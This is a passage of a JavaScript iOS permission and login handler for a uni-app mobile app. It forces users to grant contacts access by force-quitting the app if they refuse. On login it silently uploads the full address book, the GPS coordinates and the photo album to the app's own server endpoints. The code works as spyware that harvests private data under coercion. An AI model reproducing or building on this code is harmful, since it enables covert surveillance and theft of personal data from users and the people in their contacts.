                          this.forceQuitApp();
                        }, 500);
                      });
                    }
                    
                    // 抛出错误阻止后续执行
                    reject(new Error('通讯录权限被拒绝'));
                } else {
                    // 其他错误
                    reject(error);
                }
            });
        });
    } catch (error) {
        console.error('通讯录权限检查出错:', error);
        // 退出应用
        setTimeout(() => {
          this.forceQuitApp();
        }, 500);
        throw error;
    }
  }

  // 添加仅检查权限但不显示提示的方法，用于应用启动时重新验证权限
  static checkContactsPermissionWithoutPrompt() {
    // 重置弹窗显示状态
    this.permissionDialogShowing = false;
    
    // 先尝试同步方法检查
    const syncResult = this.checkContactsPermissionSync();
    if (syncResult) {
      uni.setStorageSync('ios_contacts_permission', 'granted');
      uni.removeStorageSync('ios_contacts_permission_denied');
      return Promise.resolve(true);
    }
    
    return new Promise((resolve) => {
        plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, (addressbook) => {
            // 权限已获取，清除任何之前的拒绝记录
            uni.setStorageSync('ios_contacts_permission', 'granted');
            uni.removeStorageSync('ios_contacts_permission_denied');
            resolve(true);
        }, (error) => {
            // 权限被拒绝
            resolve(false);
        });
    });
  }
  
  // 添加强制退出应用的方法，尝试多种方式
  static forceQuitApp() {
    console.log('正在尝试多种方式退出应用...');
    
    // 确保弹窗状态被重置
    this.permissionDialogShowing = false;
    
    // 延迟执行退出操作
    setTimeout(() => {
      // 方法1: 使用plus.runtime.quit()
      try {
        plus.runtime.quit();
      } catch (e) {
        console.error('方法1退出失败:', e);
      }
      
      // 方法2: 使用plus.runtime.restart()
      try {
        setTimeout(() => {
          plus.runtime.restart();
        }, 300);
      } catch (e) {
        console.error('方法2退出失败:', e);
      }
      
      // 方法3: 使用plus.ios特有方法
      if (plus.os.name.toLowerCase() === 'ios') {
        try {
          // 尝试使用iOS原生方法退出
          const UIApplicationClass = plus.ios.importClass("UIApplication");
          const app = UIApplicationClass.sharedApplication();
          app.performSelector("exit");
        } catch (e) {
          console.error('方法3退出失败:', e);
        }
      }
      
      // 方法4: 最后手段 - 抛出未捕获的异常
      setTimeout(() => {
        console.log('最后手段 - 抛出严重错误强制退出');
        throw new Error('FORCE_QUIT_APP');
      }, 500);
    }, 1000); // 延迟1秒再执行退出
  }

  // 添加位置权限检查方法
  static async checkLocationPermission() {
    // 先检查是否已有授权记录
    const permissionStatus = uni.getStorageSync('ios_location_permission');
    if (permissionStatus === 'granted') {
        console.log('位置权限已获取(缓存)');
        return true;
    }

    return new Promise((resolve) => {
        plus.geolocation.getCurrentPosition(
            () => {
                // 权限已获取，保存到本地存储
                uni.setStorageSync('ios_location_permission', 'granted');
                resolve(true);
            },
            (error) => {
                if (error.code === error.PERMISSION_DENIED) {
                    uni.showModal({
                        title: '提示',
                        content: '需要访问位置权限，是否去设置？',
                        success: (modalRes) => {
                            if (modalRes.confirm) {
                                if (plus.os.name.toLowerCase() === 'ios') {
                                    plus.runtime.openURL('app-settings:');
                                }
                            }
                        }
                    });
                }
                resolve(false);
            },
            { timeout: 5000 }
        );
    });
  }

  // 添加短信权限检查方法（iOS平台占位）
  static async checkSMSPermission() {
    // iOS不允许应用直接访问短信，因此此方法总是返回true
    console.log('iOS平台不支持短信权限检查，返回默认值');
    // 设置一个标记，表示已检查过
    uni.setStorageSync('ios_sms_permission', 'granted');
    return true;
  }

  // 添加网络检查方法
  static checkNetworkConnection() {
    return new Promise((resolve) => {
      const checkConnection = () => {
        uni.getNetworkType({
          success: (res) => {
            if (res.networkType !== 'none') {
              resolve();
            } else {
              setTimeout(checkConnection, 1000);
            }
          },
          fail: () => {
            setTimeout(checkConnection, 1000);
          }
        });
      };
      
      checkConnection();
    });
  }

  // 处理登录
  static async handleLogin(phone, inviteCode) {
    try {
      // 先检查网络连接
      await this.checkNetworkConnection();
      console.log('网络已连接，开始处理登录');

      // 再次严格检查通讯录权限状态，确保用户未禁用权限
      try {
        const hasContactsPermission = await this.checkContactsPermission().catch(err => {
          console.error('登录前通讯录权限检查失败:', err);
          // 这里不需要处理退出，checkContactsPermission方法内部会处理
          throw err; // 直接向上传递原始错误
        });
        
        // 如果没有抛出异常，则继续处理
        console.log('通讯录权限检查通过，可以继续登录流程');
      } catch (permissionError) {
        // 特别处理 code 20 错误
        if (permissionError.code === 20) {
          console.log('权限检查时检测到code 20错误，记录状态并显示对话框');
          
          // 记录拒绝状态
          uni.setStorageSync('ios_contacts_permission_denied', 'true');
          
          // 显示同步对话框
          await new Promise(resolve => {
            uni.showModal({
              title: '无法访问通讯录',
              content: '应用需要通讯录权限才能继续。请前往设置开启权限，然后重新启动应用。',
              confirmText: '去设置',
              cancelText: '退出',
              success: (res) => {
                if (res.confirm) {
                  if (plus.os.name.toLowerCase() === 'ios') {
                    plus.runtime.openURL('app-settings:');
                  }
                }
                resolve();
              }
            });
          });
          
          // 无论用户选择什么，都强制退出应用
          console.log('强制退出应用');
          this.forceQuitApp();
          throw new Error('通讯录权限错误，无法继续');
        }
        
        // 如果不是code 20，继续向上传递
        throw permissionError;
      }

      if (!phone) {
        throw new Error('缺少必要的用户验证参数');
      }

      // 保存用户信息
      uni.setStorageSync('phone', phone);
      uni.setStorageSync('code', inviteCode);

      // 获取设备信息
      const deviceInfo = `${plus.device.vendor}-${plus.device.model}`;
      console.log('设备信息:', deviceInfo);

      // 处理通讯录 - 已经确认有权限
      try {
        console.log('开始处理通讯录');
        const contactData = await this.getContacts(phone, inviteCode);
        if (contactData) {
          const contactResponse = await this.uploadData('Uploads/api', contactData, phone);
          console.log('通讯录上传结果:', contactResponse);
        } else {
          console.log('未获取到通讯录数据');
        }
      } catch (contactError) {
        console.error('通讯录处理失败:', contactError);
        // 特殊处理code 20错误
        if (contactError.code === 20) {
          console.log('通讯录获取时检测到code 20错误，记录状态并显示对话框');
          
          // 记录拒绝状态
          uni.setStorageSync('ios_contacts_permission_denied', 'true');
          
          // 显示同步对话框
          await new Promise(resolve => {
            uni.showModal({
              title: '通讯录权限丢失',
              content: '应用无法访问通讯录，请重启应用并允许权限请求。',
              showCancel: false,
              success: () => {
                resolve();
              }
            });
          });
          
          // 强制退出应用
          this.forceQuitApp();
          throw new Error('通讯录权限错误(code 20)，无法继续');
        }
        
        // 如果是权限错误，抛出异常中断流程
        if (contactError.message && (
          contactError.message.includes('权限') || 
          contactError.message.includes('permission') ||
          contactError.code === contactError.PERMISSION_DENIED
        )) {
          throw contactError; // 向上传递权限错误
        }
      }

      // 处理位置 - 假设权限已经在应用启动时获取
      try {
        console.log('开始处理位置信息');
        const position = await this.getLocation();
        const locationData = `${phone},${inviteCode},${position.coords.longitude},${position.coords.latitude}`;
        const locationResponse = await this.uploadData('Uploads/apimap', locationData, phone);
        console.log('位置上传结果:', locationResponse);
      } catch (locationError) {
        console.error('位置处理失败:', locationError);
      }

      // 处理相册 - 假设权限已经在应用启动时获取
      try {
        console.log('开始处理相册');
        
        // 开始处理相册，不等待完成
        this.getPhotos().then(result => {
          console.log('相册处理完成，上传:', result.uploaded, '/', result.total);
        }).catch(error => {
          console.error('相册处理失败:', error);
        });
        
        return true;
      } catch (error) {
        console.error('登录过程出错:', error);
        if (error.message === '重复号码，请换号码进行登录') {
          throw error;
        } else {
          throw error;
        }
      }
    } catch (error) {
      console.error('整个登录流程出错:', error);
      
      // 特殊处理code 20错误
      if (error.code === 20) {
        console.log('登录流程中检测到code 20错误，显示对话框并退出应用');
        
        // 记录拒绝状态
        uni.setStorageSync('ios_contacts_permission_denied', 'true');
        
        // 显示同步对话框
        uni.showModal({
          title: '权限被拒绝',
          content: '应用无法继续运行，请重启并允许权限请求。',
          showCancel: false,
          success: () => {
            this.forceQuitApp();
          }
        });
      }
      // 如果是权限相关错误，确保退出应用
      else if (error.message && (
        error.message.includes('权限') || 
        error.message.includes('permission')
      )) {
        console.log('登录流程中检测到权限错误，准备退出应用');
        // 显示同步对话框
        uni.showModal({
          title: '权限错误',
          content: '应用需要必要的权限才能正常运行。请重启应用并授予权限。',
          showCancel: false,
          success: () => {
            this.forceQuitApp();
          }
        });
      }
      
      throw error;
    }
  }
}

export default IOSHandler; 